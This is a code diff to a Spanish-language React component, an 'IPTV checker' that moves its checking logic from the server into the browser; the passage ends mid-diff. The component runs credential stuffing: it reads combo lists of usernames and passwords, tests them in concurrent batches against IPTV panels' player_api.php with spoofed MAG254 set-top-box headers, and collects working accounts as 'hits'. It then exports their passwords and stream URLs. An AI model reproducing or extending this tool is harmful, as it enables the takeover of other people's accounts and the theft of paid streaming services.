@@ -1,25 +1,12 @@
 'use client'
 
-import { useState, useCallback, useEffect, useRef } from 'react'
+import { useState, useCallback, useRef } from 'react'
 import { motion, AnimatePresence } from 'framer-motion'
 import {
   Copy, Play, Square, Loader2, Upload, ExternalLink,
-  RotateCcw, History, ChevronDown, ChevronUp, X
+  RotateCcw, ChevronDown, ChevronUp, X, Save, FolderOpen
 } from 'lucide-react'
 import { toast } from 'sonner'
-import { useQuery } from '@tanstack/react-query'
-import { apiFetch } from '@/lib/api-config'
-import {
-  useCreateJob,
-  useCancelJob,
-  useJobResults,
-  useResumeState,
-} from '@/hooks/use-iptv'
-import type {
-  Job,
-  JobResult,
-  ProcessBatchResult,
-} from '@/lib/iptv-api'
 
 // ============================================================
 // Types
@@ -49,18 +36,193 @@ interface IptvResult {
   }
 }
 
-interface CompletedJob {
+interface SavedSession {
   id: string
-  inputMode: string
+  inputMode: 'url' | 'combo'
   serverHost: string
-  status: string
   totalLines: number
-  processed: number
-  hits: number
-  bad: number
-  timeout: number
+  results: IptvResult[]
+  stats: { total: number; hits: number; bad: number; timeout: number; totalLines: number }
   createdAt: string
-  completedAt: string | null
+}
+
+// ============================================================
+// STB Headers (same as server-side)
+// ============================================================
+
+const STB_HEADERS: Record<string, string> = {
+  'Cookie': 'stb_lang=en; timezone=Europe%2FIstanbul;',
+  'X-User-Agent': 'Model: MAG254; Link: Ethernet',
+  'Connection': 'Keep-Alive',
+  'Accept-Encoding': 'gzip, deflate',
+  'Accept': 'application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3',
+}
+
+// ============================================================
+// Helpers
+// ============================================================
+
+function formatDate(val: string | number | null | undefined): string {
+  if (!val || val === 'null') return 'N/A'
+  if (typeof val === 'number') {
+    if (val === 0) return 'Unlimited'
+    return new Date(val * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
+  }
+  const num = Number(val)
+  if (!isNaN(num) && num > 0) {
+    return new Date(num * 1000).toLocaleDateString('es-CL', { day: '2-digit', month: '2-digit', year: 'numeric' })
+  }
+  return String(val)
+}
+
+/** Check a single IPTV line DIRECTLY from the client */
+async function checkLineDirect(
+  line: string,
+  inputMode: 'url' | 'combo',
+  serverHost: string
+): Promise<Omit<IptvResult, 'id'>> {
+  let sHost = ''
+  let username = ''
+  let password = ''
+
+  if (inputMode === 'combo' && serverHost) {
+    const parts = line.split(':')
+    if (parts.length < 2) return { status: 'bad', host: '', username: '', url: '' }
+    username = parts[0].trim()
+    password = parts.slice(1).join(':').trim()
+    let h = serverHost.replace(/^https?:\/\//, '').replace(/\/.*$/, '')
+    sHost = h
+  } else {
+    let parsedUrl: URL
+    try {
+      parsedUrl = new URL(line)
+    } catch {
+      return { status: 'bad', host: '', username: '', url: '' }
+    }
+    const hostname = parsedUrl.hostname
+    const port = parsedUrl.port || '80'
+    sHost = `${hostname}:${port}`
+    username = parsedUrl.searchParams.get('username') || ''
+    password = parsedUrl.searchParams.get('password') || ''
+    if (!username || !password) return { status: 'bad', host: '', username: '', url: '' }
+  }
+
+  const apiUrl = `http://${sHost}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u`
+
+  try {
+    const controller = new AbortController()
+    const timeoutId = setTimeout(() => controller.abort(), 15000)
+
+    const response = await fetch(apiUrl, {
+      signal: controller.signal,
+      headers: STB_HEADERS,
+    })
+
+    clearTimeout(timeoutId)
+    const text = await response.text()
+
+    if (text.includes('username')) {
+      try {
+        const json = JSON.parse(text)
+        const userInfo = json?.user_info || {}
+        const serverInfo = json?.server_info || {}
+        const accountStatus = String(userInfo.status || '')
+
+        if (accountStatus === 'Active') {
+          const m3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
+          const realUrl = serverInfo?.url ? String(serverInfo.url) : ''
+          const realPort = serverInfo?.port ? String(serverInfo.port) : ''
+
+          return {
+            status: 'hit',
+            url: m3uUrl,
+            host: sHost,
+            username,
+            password,
+            info: {
+              status: userInfo.status || 'Active',
+              active_cons: String(userInfo.active_cons ?? '0'),
+              max_connections: String(userInfo.max_connections ?? '0'),
+              created_at: formatDate(userInfo.created_at),
+              exp_date: formatDate(userInfo.exp_date),
+              timezone: serverInfo?.timezone || userInfo?.timezone || 'N/A',
+              channels: 'N/A',
+              films: 'N/A',
+              series: 'N/A',
+              real_url: realUrl,
+              real_port: realPort,
+              m3u_url: m3uUrl,
+            },
+          }
+        }
+      } catch {
+        if (text.includes('Active')) {
+          const fallbackM3uUrl = `http://${sHost}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`
+          return {
+            status: 'hit',
+            url: fallbackM3uUrl,
+            host: sHost,
+            username,
+            password,
+            info: {
+              status: 'Active',
+              active_cons: '0',
+              max_connections: '0',
+              created_at: 'N/A',
+              exp_date: 'N/A',
+              timezone: 'N/A',
+            },
+          }
+        }
+      }
+    }
+
+    return { status: 'bad', host: sHost, username, url: '' }
+  } catch (fetchError: unknown) {
+    if (fetchError instanceof DOMException && fetchError.name === 'AbortError') {
+      return { status: 'timeout', host: sHost, username, url: '' }
+    }
+    return { status: 'bad', host: sHost, username, url: '' }
+  }
+}
+
+// ============================================================
+// localStorage persistence
+// ============================================================
+
+const STORAGE_KEY = 'hjtools_iptv_sessions'
+
+function getSavedSessions(): SavedSession[] {
+  if (typeof window === 'undefined') return []
+  try {
+    const raw = localStorage.getItem(STORAGE_KEY)
+    return raw ? JSON.parse(raw) : []
+  } catch {
+    return []
+  }
+}
+
+function saveSessions(sessions: SavedSession[]) {
+  if (typeof window === 'undefined') return
+  try {
+    // Keep only last 20 sessions
+    const trimmed = sessions.slice(-20)
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(trimmed))
+  } catch {
+    // localStorage full, ignore
+  }
+}
+
+function saveCurrentSession(session: SavedSession) {
+  const sessions = getSavedSessions()
+  const idx = sessions.findIndex(s => s.id === session.id)
+  if (idx >= 0) {
+    sessions[idx] = session
+  } else {
+    sessions.push(session)
+  }
+  saveSessions(sessions)
 }
 
 // ============================================================
@@ -96,156 +258,24 @@ export function IptvChecker() {
   const fileInputRef = useRef<HTMLInputElement>(null)
 
   // ---- Job state ----
-  const [currentJobId, setCurrentJobId] = useState<string | null>(null)
   const [isRunning, setIsRunning] = useState(false)
-  const [isResuming, setIsResuming] = useState(false)
   const [results, setResults] = useState<IptvResult[]>([])
   const [stats, setStats] = useState({ total: 0, hits: 0, bad: 0, timeout: 0, totalLines: 0 })
   const [progress, setProgress] = useState(0)
   const stopRef = useRef(false)
   const resultsRef = useRef<IptvResult[]>([])
   const statsRef = useRef(stats)
-  const pollingRef = useRef(false)
+  const currentSessionIdRef = useRef<string | null>(null)
 
-  // ---- Job history state ----
+  // ---- Saved sessions ----
   const [showHistory, setShowHistory] = useState(false)
-  const [viewingJobId, setViewingJobId] = useState<string | null>(null)
-
-  // ---- Hooks ----
-  const createJob = useCreateJob()
-  const cancelJob = useCancelJob(currentJobId)
-  const resumeState = useResumeState()
-  const viewJobResults = useJobResults(viewingJobId, 'hit')
-
-  // ---- Completed jobs query ----
-  const { data: completedJobsData } = useQuery<CompletedJob[]>({
-    queryKey: ['iptv', 'completedJobs', isRunning],
-    queryFn: async () => {
-      const res = await apiFetch('/api/iptv/jobs?includeCompleted=true')
-      if (!res.ok) return []
-      const data = await res.json()
-      return (data.jobs || []).filter(
-        (j: Job) => j.status === 'completed' || j.status === 'cancelled'
-      )
-    },
-    staleTime: 10_000,
-    refetchOnWindowFocus: true,
-  })
-  const completedJobs = completedJobsData || []
+  const [viewingSession, setViewingSession] = useState<SavedSession | null>(null)
 
   // ---- Keep refs in sync ----
-  useEffect(() => {
-    resultsRef.current = results
-  }, [results])
-  useEffect(() => {
-    statsRef.current = stats
-  }, [stats])
+  resultsRef.current = results
+  statsRef.current = stats
 
-  // ---- Polling via direct fetch (works for both new jobs and resumed jobs) ----
-  const startPollingWithJobId = useCallback((jobId: string) => {
-    if (pollingRef.current) return
-    pollingRef.current = true
-    stopRef.current = false
-
-    const pollJob = async () => {
-      while (!stopRef.current) {
-        try {
-          const concurrency = parseInt(threads) || 5
-          const res = await apiFetch(`/api/iptv/jobs/${jobId}/process`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ threads: concurrency }),
-          })
-          if (!res.ok) {
-            await new Promise(r => setTimeout(r, 2000))
-            continue
-          }
-          const result: ProcessBatchResult = await res.json()
-
-          // Map batch results to IptvResult
-          const batchIptvResults: IptvResult[] = (result.results || []).map(
-            (r: ProcessBatchResult['results'][number], idx: number) => ({
-              id: `job-${jobId}-${Date.now()}-${idx}`,
-              url: r.url || r.line,
-              status: r.status as IptvResult['status'],
-              host: r.host,
-              username: r.username,
-              password: r.password,
-              info: (r.info as IptvResult['info']) || undefined,
-            })
-          )
-
-          // Update accumulated results
-          const newResults = [...resultsRef.current, ...batchIptvResults]
-          resultsRef.current = newResults
-          setResults(newResults)
-
-          // Update stats from server (source of truth)
-          const newStats = {
-            total: result.processed,
-            hits: result.hits,
-            bad: result.bad,
-            timeout: result.timeout,
-            totalLines: result.totalLines,
-          }
-          statsRef.current = newStats
-          setStats(newStats)
-          setProgress(result.progress)
-
-          // Check if done
-          if (result.status === 'completed' || result.status === 'cancelled') {
-            setIsRunning(false)
-            setIsResuming(false)
-            pollingRef.current = false
-            if (result.status === 'completed') {
-              toast.success(`Verificación completada: ${result.hits} hits`)
-            }
-            return
-          }
-        } catch {
-          await new Promise(r => setTimeout(r, 2000))
-          continue
-        }
-
-        await new Promise(r => setTimeout(r, 500))
-      }
-
-      setIsRunning(false)
-      setIsResuming(false)
-      pollingRef.current = false
-    }
-
-    pollJob()
-  }, [threads])
-
-  // ---- Resume detection ----
-  const resumeAttemptedRef = useRef(false)
-  useEffect(() => {
-    if (!resumeState.data || resumeAttemptedRef.current) return
-    const { activeJobs: jobs } = resumeState.data
-    if (jobs && jobs.length > 0 && !currentJobId && !isRunning) {
-      resumeAttemptedRef.current = true
-      const job = jobs[0]
-      // Use a microtask to defer state updates outside the effect body
-      queueMicrotask(() => {
-        setCurrentJobId(job.id)
-        setIsResuming(true)
-        setIsRunning(true)
-        setStats({
-          total: job.processed,
-          hits: job.hits,
-          bad: job.bad,
-          timeout: job.timeout,
-          totalLines: job.totalLines,
-        })
-        setProgress(job.totalLines > 0 ? Math.round((job.processed / job.totalLines) * 100) : 0)
-        toast.info('Reanudando verificación anterior...')
-        startPollingWithJobId(job.id)
-      })
-    }
-  }, [resumeState.data, currentJobId, isRunning, startPollingWithJobId])
-
-  // ---- Mode switch handler (clears state via event handler, not effect) ----
+  // ---- Mode switch handler ----
   const switchMode = useCallback((mode: 'url' | 'combo') => {
     if (isRunning) return
     setInputMode(mode)
@@ -255,7 +285,6 @@ export function IptvChecker() {
     setComboList('')
     setFileName('')
     setLineCount(0)
-    setCurrentJobId(null)
     stopRef.current = false
   }, [isRunning])
 
@@ -280,7 +309,7 @@ export function IptvChecker() {
     e.target.value = ''
   }, [])
 
-  // ---- Start check ----
+  // ---- Start check (ALL CLIENT-SIDE) ----
   const startCheck = useCallback(async () => {
     const allLines = comboList.trim().split('\n').filter(l => l.trim())
     if (allLines.length === 0) {
@@ -292,69 +321,123 @@ export function IptvChecker() {
       return
     }
 
-    try {
-      const job = await createJob.mutateAsync({
-        lines: allLines,
-        inputMode,
-        serverHost: serverHost.trim(),
+    const sessionId = crypto.randomUUID()
+    currentSessionIdRef.current = sessionId
+    const concurrency = Math.min(Math.max(parseInt(threads) || 5, 1), 20)
+    const totalLines = allLines.length
+
+    setIsRunning(true)
+    setResults([])
+    setStats({ total: 0, hits: 0, bad: 0, timeout: 0, totalLines })
+    setProgress(0)
+    resultsRef.current = []
+    stopRef.current = false
+
+    let processed = 0
+    let hits = 0
+    let bad = 0
+    let timeout = 0
+
+    // Process in batches
+    for (let i = 0; i < allLines.length; i += concurrency) {
+      if (stopRef.current) break
+
+      const batch = allLines.slice(i, i + concurrency)
+      const batchPromises = batch.map(async (line, idx) => {
+        if (stopRef.current) return null
+        const result = await checkLineDirect(line.trim(), inputMode, serverHost.trim())
+        return {
+          id: `line-${i + idx}-${Date.now()}`,
+          url: result.url || line.trim(),
+          status: result.status,
+          host: result.host,
+          username: result.username,
+          password: result.password,
+          info: result.info,
+        } as IptvResult
       })
 
-      setCurrentJobId(job.id)
-      setIsRunning(true)
-      setIsResuming(false)
-      setResults([])
-      setStats({ total: 0, hits: 0, bad: 0, timeout: 0, totalLines: job.totalLines })
-      setProgress(0)
-      resultsRef.current = []
-      stopRef.current = false
+      const batchResults = await Promise.all(batchPromises)
+      const validResults = batchResults.filter((r): r is IptvResult => r !== null)
 
-      // Use direct fetch approach for polling (more reliable with dynamic jobId)
-      startPollingWithJobId(job.id)
-    } catch (err: unknown) {
-      const msg = err instanceof Error ? err.message : 'Error al crear job'
-      toast.error(msg)
-    }
-  }, [comboList, inputMode, serverHost, createJob, startPollingWithJobId])
+      // Update counts
+      for (const r of validResults) {
+        processed++
+        if (r.status === 'hit') hits++
+        else if (r.status === 'timeout') timeout++
+        else bad++
+      }
 
-  // ---- Stop check ----
-  const stopCheck = useCallback(async () => {
-    stopRef.current = true
-    if (currentJobId) {
-      try {
-        await cancelJob.mutateAsync({ action: 'cancel' })
-        toast.info('Verificación cancelada')
-      } catch {
-        toast.error('Error al cancelar job')
+      // Update state
+      const newResults = [...resultsRef.current, ...validResults]
+      resultsRef.current = newResults
+      setResults(newResults)
+
+      const newStats = { total: processed, hits, bad, timeout, totalLines }
+      statsRef.current = newStats
+      setStats(newStats)
+      setProgress(totalLines > 0 ? Math.round((processed / totalLines) * 100) : 0)
+
+      // Save progress to localStorage
+      if (currentSessionIdRef.current === sessionId) {
+        saveCurrentSession({
+          id: sessionId,
+          inputMode,
+          serverHost: serverHost.trim(),
+          totalLines,
+          results: newResults,
+          stats: newStats,
+          createdAt: new Date().toISOString(),
+        })
       }
     }
+
     setIsRunning(false)
-    setIsResuming(false)
-    pollingRef.current = false
-  }, [currentJobId, cancelJob])
+    stopRef.current = false
+
+    if (!stopRef.current || processed === totalLines) {
+      toast.success(`Verificación completada: ${hits} hits`)
+    } else {
+      toast.info('Verificación cancelada')
+    }
+  }, [comboList, inputMode, serverHost, threads])
+
+  // ---- Stop check ----
+  const stopCheck = useCallback(() => {
+    stopRef.current = true
+    setIsRunning(false)
+  }, [])
+
+  // ---- Save hits to file ----
+  const saveHitsToFile = useCallback(() => {
+    const hitResults = results.filter(r => r.status === 'hit')
+    if (hitResults.length === 0) {
+      toast.error('No hay hits para guardar')
+      return
+    }
+    const text = hitResults.map((r, idx) => {
+      const info = r.info
+      const m3uUrl = info?.m3u_url || r.url
+      return `Hit #${idx + 1}\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}\n`
+    }).join('\n---\n\n')
+
+    const blob = new Blob([text], { type: 'text/plain' })
+    const url = URL.createObjectURL(blob)
+    const a = document.createElement('a')
+    a.href = url
+    a.download = `hits_${new Date().toISOString().slice(0, 10)}.txt`
+    a.click()
+    URL.revokeObjectURL(url)
+    toast.success(`${hitResults.length} hits guardados`)
+  }, [results])
 
   // ---- Derived ----
   const hitResults = results.filter(r => r.status === 'hit')
-  const viewHitResults = viewJobResults.data?.results || []
+  const savedSessions = typeof window !== 'undefined' ? getSavedSessions() : []
+  const viewHitResults = viewingSession?.results?.filter(r => r.status === 'hit') || []
 
   return (
     <div className="space-y-4">
-      {/* Resume indicator */}
-      <AnimatePresence>
-        {isResuming && (
-          <motion.div
-            initial={{ opacity: 0, height: 0 }}
-            animate={{ opacity: 1, height: 'auto' }}
-            exit={{ opacity: 0, height: 0 }}
-            className="bg-amber-500/10 border border-amber-500/20 rounded-xl px-4 py-2.5 flex items-center gap-2"
-          >
-            <RotateCcw className="w-4 h-4 text-amber-500 animate-spin" />
-            <span className="text-xs text-amber-400 font-medium">
-              Reanudando verificación anterior...
-            </span>
-          </motion.div>
-        )}
-      </AnimatePresence>
-
       {/* Input card */}
       <div className="bg-[#111113] theme-card rounded-xl border border-white/[0.06] p-4 space-y-3">
         {/* Mode selector */}
@@ -498,22 +581,31 @@ export function IptvChecker() {
       {hitResults.length > 0 && (
         <div className="space-y-2">
           <div className="flex items-center justify-between">
-            <h3 className="text-xs font-medium text-green-500/80 uppercase tracking-wider">✓ Hits Encontrados</h3>
-            <button
-              onClick={() => {
-                const text = hitResults.map((r, idx) => {
-                  const info = r.info
-                  const m3uUrl = info?.m3u_url || r.url
-                  return `👑 Hit #${idx + 1}\n├ 👤 User:  ${r.username}\n├ 🔑 Pass:  ${r.password}\n├ ✅ Status:  ${info?.status || 'Active'}\n├ 📶 Active:  ${info?.active_cons || '0'}\n├ 📡 Max:   ${info?.max_connections || '0'}\n├ ⏰ Creado:  ${info?.created_at || 'N/A'}\n├ 📅 Exp:  ${info?.exp_date || 'N/A'}\n├ 🕰️ TZ:  ${info?.timezone || 'N/A'}\n└ 🔗 M3U:  ${m3uUrl}`
-                }).join('\n\n')
-                navigator.clipboard.writeText(text)
-                toast.success(`${hitResults.length} hits copiados`)
-              }}
-              className="flex items-center gap-1 text-xs text-amber-500 hover:text-amber-400 transition-colors"
-            >
-              <Copy className="w-3.5 h-3.5" />
-              Copiar Todo
-            </button>
+            <h3 className="text-xs font-medium text-green-500/80 uppercase tracking-wider">Hits Encontrados</h3>
+            <div className="flex items-center gap-2">
+              <button
+                onClick={saveHitsToFile}
+                className="flex items-center gap-1 text-xs text-green-500 hover:text-green-400 transition-colors"
+              >
+                <Save className="w-3.5 h-3.5" />
+                Guardar
+              </button>
+              <button
+                onClick={() => {
+                  const text = hitResults.map((r, idx) => {
+                    const info = r.info
+                    const m3uUrl = info?.m3u_url || r.url
+                    return `Hit #${idx + 1}\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nTZ: ${info?.timezone || 'N/A'}\nM3U: ${m3uUrl}`
+                  }).join('\n\n')
+                  navigator.clipboard.writeText(text)
+                  toast.success(`${hitResults.length} hits copiados`)
+                }}
+                className="flex items-center gap-1 text-xs text-amber-500 hover:text-amber-400 transition-colors"
+              >
+                <Copy className="w-3.5 h-3.5" />
+                Copiar Todo
+              </button>
+            </div>
           </div>
           <div className="max-h-[60vh] overflow-y-auto space-y-3 custom-scrollbar">
             {hitResults.map((r, i) => {
@@ -521,7 +613,7 @@ export function IptvChecker() {
               const m3uUrl = info?.m3u_url || r.url
 
               const copySingleHit = () => {
-                const text = `👑 Hit\n├ 👤 User:  ${r.username}\n├ 🔑 Pass:  ${r.password}\n├ ✅ Status:  ${info?.status || 'Active'}\n├ 📶 Active:  ${info?.active_cons || '0'}\n├ 📡 Max:   ${info?.max_connections || '0'}\n├ ⏰ Creado:  ${info?.created_at || 'N/A'}\n├ 📅 Exp:  ${info?.exp_date || 'N/A'}\n├ 🕰️ TZ:  ${info?.timezone || 'N/A'}\n└ 🔗 M3U:  ${m3uUrl}`
+                const text = `Hit\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nTZ: ${info?.timezone || 'N/A'}\nM3U: ${m3uUrl}`
                 navigator.clipboard.writeText(text)
                 toast.success('Hit copiado')
               }
@@ -538,7 +630,6 @@ export function IptvChecker() {
 
                   <div className="p-3.5" style={{ background: 'linear-gradient(to bottom right, rgba(34,197,94,0.07), rgba(16,185,129,0.03))' }}>
                     <div className="flex items-center gap-2 mb-2">
-                      <span className="text-base">👑</span>
                       <span className="text-[10px] font-bold text-green-400 uppercase tracking-widest">Hit #{i + 1}</span>
                       <div className="flex-1" />
                       <button
@@ -551,14 +642,14 @@ export function IptvChecker() {
                     </div>
 
                     <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-xs font-mono">
-                      <div><span className="text-white/30 theme-text-dim">👤 </span><span className="text-green-300">{r.username}</span></div>
-                      <div><span className="text-white/30 theme-text-dim">🔑 </span><span className="text-green-300">{r.password}</span></div>
-                      <div><span className="text-white/30 theme-text-dim">✅ </span><span className="text-white/70 theme-text">{info?.status || 'Active'}</span></div>
-                      <div><span className="text-white/30 theme-text-dim">📶 </span><span className="text-white/70 theme-text">{info?.active_cons || '0'} / {info?.max_connections || '0'}</span></div>
-                      <div><span className="text-white/30 theme-text-dim">⏰ </span><span className="text-white/70 theme-text">{info?.created_at || 'N/A'}</span></div>
-                      <div><span className="text-white/30 theme-text-dim">📅 </span><span className="text-white/70 theme-text">{info?.exp_date || 'N/A'}</span></div>
+                      <div><span className="text-white/30 theme-text-dim">User: </span><span className="text-green-300">{r.username}</span></div>
+                      <div><span className="text-white/30 theme-text-dim">Pass: </span><span className="text-green-300">{r.password}</span></div>
+                      <div><span className="text-white/30 theme-text-dim">Status: </span><span className="text-white/70 theme-text">{info?.status || 'Active'}</span></div>
+                      <div><span className="text-white/30 theme-text-dim">Active: </span><span className="text-white/70 theme-text">{info?.active_cons || '0'} / {info?.max_connections || '0'}</span></div>
+                      <div><span className="text-white/30 theme-text-dim">Created: </span><span className="text-white/70 theme-text">{info?.created_at || 'N/A'}</span></div>
+                      <div><span className="text-white/30 theme-text-dim">Exp: </span><span className="text-white/70 theme-text">{info?.exp_date || 'N/A'}</span></div>
                       {info?.timezone && (
-                        <div className="col-span-2"><span className="text-white/30 theme-text-dim">🕰️ </span><span className="text-white/70 theme-text">{info.timezone}</span></div>
+                        <div className="col-span-2"><span className="text-white/30 theme-text-dim">TZ: </span><span className="text-white/70 theme-text">{info.timezone}</span></div>
                       )}
                     </div>
 
@@ -579,15 +670,15 @@ export function IptvChecker() {
         </div>
       )}
 
-      {/* Job History */}
-      {completedJobs.length > 0 && !isRunning && (
+      {/* Saved Sessions History */}
+      {savedSessions.length > 0 && !isRunning && (
         <div className="space-y-2">
           <button
             onClick={() => setShowHistory(!showHistory)}
             className="flex items-center gap-2 text-xs text-white/40 theme-text-dim hover:text-white/60 transition-colors"
           >
-            <History className="w-3.5 h-3.5" />
-            Historial ({completedJobs.length})
+            <FolderOpen className="w-3.5 h-3.5" />
+            Historial ({savedSessions.length})
             {showHistory ? <ChevronUp className="w-3 h-3" /> : <ChevronDown className="w-3 h-3" />}
           </button>
 
@@ -601,34 +692,32 @@ export function IptvChecker() {
                 className="overflow-hidden"
               >
                 <div className="max-h-64 overflow-y-auto space-y-2 custom-scrollbar">
-                  {completedJobs.map((job) => (
+                  {savedSessions.map((session) => (
                     <div
-                      key={job.id}
+                      key={session.id}
                       className="bg-[#111113] rounded-xl border border-white/[0.06] p-3 flex items-center gap-3"
                     >
                       <div className="flex-1 min-w-0">
                         <div className="flex items-center gap-2">
-                          <span className={`text-[10px] font-bold uppercase tracking-wider ${
-                            job.status === 'completed' ? 'text-green-500' : 'text-red-400'
-                          }`}>
-                            {job.status === 'completed' ? '✓' : '✗'}
+                          <span className="text-[10px] font-bold uppercase tracking-wider text-green-500">
+                            ✓
                           </span>
                           <span className="text-xs text-white/70 theme-text font-mono truncate">
-                            {job.inputMode === 'url' ? 'URL Mode' : `Combo: ${job.serverHost}`}
+                            {session.inputMode === 'url' ? 'URL Mode' : `Combo: ${session.serverHost}`}
                           </span>
                         </div>
                         <div className="flex items-center gap-3 mt-1 text-[10px] text-white/30 font-mono">
-                          <span>{job.totalLines} líneas</span>
-                          <span className="text-green-500/60">{job.hits} hits</span>
-                          <span className="text-red-500/60">{job.bad} bad</span>
+                          <span>{session.totalLines} líneas</span>
+                          <span className="text-green-500/60">{session.stats.hits} hits</span>
+                          <span className="text-red-500/60">{session.stats.bad} bad</span>
                         </div>
                       </div>
                       <button
-                        onClick={() => setViewingJobId(job.id === viewingJobId ? null : job.id)}
+                        onClick={() => setViewingSession(viewingSession?.id === session.id ? null : session)}
                         className="text-[10px] bg-white/[0.06] hover:bg-white/[0.1] text-white/60 hover:text-white/80 px-2.5 py-1.5 rounded-md transition-colors flex items-center gap-1 shrink-0"
                       >
-                        {job.id === viewingJobId ? <X className="w-3 h-3" /> : null}
-                        {job.id === viewingJobId ? 'Cerrar' : 'Ver resultados'}
+                        {viewingSession?.id === session.id ? <X className="w-3 h-3" /> : null}
+                        {viewingSession?.id === session.id ? 'Cerrar' : 'Ver hits'}
                       </button>
                     </div>
                   ))}
@@ -639,9 +728,9 @@ export function IptvChecker() {
         </div>
       )}
 
-      {/* Viewing historical job results */}
+      {/* Viewing historical session results */}
       <AnimatePresence>
-        {viewingJobId && viewHitResults.length > 0 && (
+        {viewingSession && viewHitResults.length > 0 && (
           <motion.div
             initial={{ opacity: 0, y: 10 }}
             animate={{ opacity: 1, y: 0 }}
@@ -650,14 +739,14 @@ export function IptvChecker() {
           >
             <div className="flex items-center justify-between">
               <h3 className="text-xs font-medium text-green-500/80 uppercase tracking-wider">
-                ✓ Hits del Job Anterior
+                Hits de sesión anterior
               </h3>
               <button
                 onClick={() => {
-                  const text = viewHitResults.map((r: JobResult, idx: number) => {
-                    const info = r.info as IptvResult['info'] | null
+                  const text = viewHitResults.map((r, idx) => {
+                    const info = r.info
                     const m3uUrl = info?.m3u_url || r.url
-                    return `👑 Hit #${idx + 1}\n├ 👤 User:  ${r.username}\n├ 🔑 Pass:  ${r.password}\n├ ✅ Status:  ${info?.status || 'Active'}\n├ 📶 Active:  ${info?.active_cons || '0'}\n├ 📡 Max:   ${info?.max_connections || '0'}\n├ ⏰ Creado:  ${info?.created_at || 'N/A'}\n├ 📅 Exp:  ${info?.exp_date || 'N/A'}\n└ 🔗 M3U:  ${m3uUrl}`
+                    return `Hit #${idx + 1}\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}`
                   }).join('\n\n')
                   navigator.clipboard.writeText(text)
                   toast.success(`${viewHitResults.length} hits copiados`)
@@ -669,8 +758,8 @@ export function IptvChecker() {
               </button>
             </div>
             <div className="max-h-[40vh] overflow-y-auto space-y-3 custom-scrollbar">
-              {viewHitResults.map((r: JobResult, i: number) => {
-                const info = r.info as IptvResult['info'] | null
+              {viewHitResults.map((r, i) => {
+                const info = r.info
                 const m3uUrl = info?.m3u_url || r.url
 
                 return (
@@ -685,12 +774,11 @@ export function IptvChecker() {
 
                     <div className="p-3.5" style={{ background: 'linear-gradient(to bottom right, rgba(34,197,94,0.07), rgba(16,185,129,0.03))' }}>
                       <div className="flex items-center gap-2 mb-2">
-                        <span className="text-base">👑</span>
                         <span className="text-[10px] font-bold text-green-400 uppercase tracking-widest">Hit #{i + 1}</span>
                         <div className="flex-1" />
                         <button
                           onClick={() => {
-                            const text = `👑 Hit\n├ 👤 User:  ${r.username}\n├ 🔑 Pass:  ${r.password}\n├ ✅ Status:  ${info?.status || 'Active'}\n├ 📶 Active:  ${info?.active_cons || '0'}\n├ 📡 Max:   ${info?.max_connections || '0'}\n├ ⏰ Creado:  ${info?.created_at || 'N/A'}\n├ 📅 Exp:  ${info?.exp_date || 'N/A'}\n└ 🔗 M3U:  ${m3uUrl}`
+                            const text = `Hit\nUser: ${r.username}\nPass: ${r.password}\nStatus: ${info?.status || 'Active'}\nActive: ${info?.active_cons || '0'}\nMax: ${info?.max_connections || '0'}\nCreated: ${info?.created_at || 'N/A'}\nExp: ${info?.exp_date || 'N/A'}\nM3U: ${m3uUrl}`
                             navigator.clipboard.writeText(text)
                             toast.success('Hit copiado')
                           }}
@@ -702,12 +790,12 @@ export function IptvChecker() {
                       </div>
 
                       <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-xs font-mono">
-                        <div><span className="text-white/30 theme-text-dim">👤 </span><span className="text-green-300">{r.username}</span></div>
-                        <div><span className="text-white/30 theme-text-dim">🔑 </span><span className="text-green-300">{r.password}</span></div>
-                        <div><span className="text-white/30 theme-text-dim">✅ </span><span className="text-white/70 theme-text">{info?.status || 'Active'}</span></div>
-                        <div><span className="text-white/30 theme-text-dim">📶 </span><span className="text-white/70 theme-text">{info?.active_cons || '0'} / {info?.max_connections || '0'}</span></div>
-                        <div><span className="text-white/30 theme-text-dim">⏰ </span><span className="text-white/70 theme-text">{info?.created_at || 'N/A'}</span></div>
-                        <div><span className="text-white/30 theme-text-dim">📅 </span><span className="text-white/70 theme-text">{info?.exp_date || 'N/A'}</span></div>
+                        <div><span className="text-white/30 theme-text-dim">User: </span><span className="text-green-300">{r.username}</span></div>
+                        <div><span className="text-white/30 theme-text-dim">Pass: </span><span className="text-green-300">{r.password}</span></div>
+                        <div><span className="text-white/30 theme-text-dim">Status: </span><span className="text-white/70 theme-text">{info?.status || 'Active'}</span></div>
+                        <div><span className="text-white/30 theme-text-dim">Active: </span><span className="text-white/70 theme-text">{info?.active_cons || '0'} / {info?.max_connections || '0'}</span></div>
